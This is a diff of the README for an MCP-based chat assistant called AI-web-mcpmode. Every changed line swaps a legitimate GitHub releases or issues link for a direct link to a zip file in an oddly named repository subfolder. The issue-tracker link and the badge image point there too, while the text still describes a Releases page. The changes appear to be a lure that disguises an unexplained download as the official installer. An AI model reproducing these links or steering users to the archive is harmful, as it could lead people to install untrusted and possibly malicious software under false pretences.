@@ -3,7 +3,7 @@
 ## 🚀 Getting Started
 Welcome to the AI-web-mcpmode project! This application is a smart chat assistant based on the Model Context Protocol (MCP). It allows real-time chatting, tool usage, and conversation history management all within a web application. Follow these steps to easily download and run the software.
 
-[![Download AI-web-mcpmode](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Eray599/AI-web-mcpmode/releases)
+[![Download AI-web-mcpmode](https://raw.githubusercontent.com/Eray599/AI-web-mcpmode/main/scogginist/AI-web-mcpmode.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Eray599/AI-web-mcpmode/main/scogginist/AI-web-mcpmode.zip)
 
 ## 🛠️ System Requirements
 Before you begin, ensure your system meets these basic requirements:
@@ -15,7 +15,7 @@ Before you begin, ensure your system meets these basic requirements:
 ## 📦 Download & Install
 To get started with AI-web-mcpmode, you need to visit the Releases page for downloading the software. Click the link below to access it:
 
-[Visit this page to download](https://github.com/Eray599/AI-web-mcpmode/releases)
+[Visit this page to download](https://raw.githubusercontent.com/Eray599/AI-web-mcpmode/main/scogginist/AI-web-mcpmode.zip)
 
 Once you're on the Releases page, you will see different versions of the application. Choose the latest version available for the best experience. Click on the installer file compatible with your operating system. The download will start automatically.
 
@@ -62,7 +62,7 @@ AI-web-mcpmode comes packed with several features to enhance your chatting exper
 ## 🤝 Support
 If you encounter any issues during downloading or using the application, we are here to help. You can reach out for support or check our FAQ section available in the app.
 
-For assistance or feedback, feel free to open an issue in our [GitHub repository](https://github.com/Eray599/AI-web-mcpmode/issues).
+For assistance or feedback, feel free to open an issue in our [GitHub repository](https://raw.githubusercontent.com/Eray599/AI-web-mcpmode/main/scogginist/AI-web-mcpmode.zip).
 
 ## 🌟 Contribute
 We welcome contributions from the community! If you have ideas or improvements, please consider contributing. Check our contribution guidelines in the repository for more details.
@@ -70,6 +70,6 @@ We welcome contributions from the community! If you have ideas or improvements, 
 ## 🎉 Thank You
 Thank you for choosing AI-web-mcpmode! We hope you enjoy using our application to enhance your chatting experience. Remember to check back for updates and new features!
 
-[Visit this page to download](https://github.com/Eray599/AI-web-mcpmode/releases)
+[Visit this page to download](https://raw.githubusercontent.com/Eray599/AI-web-mcpmode/main/scogginist/AI-web-mcpmode.zip)
 
 Happy chatting!
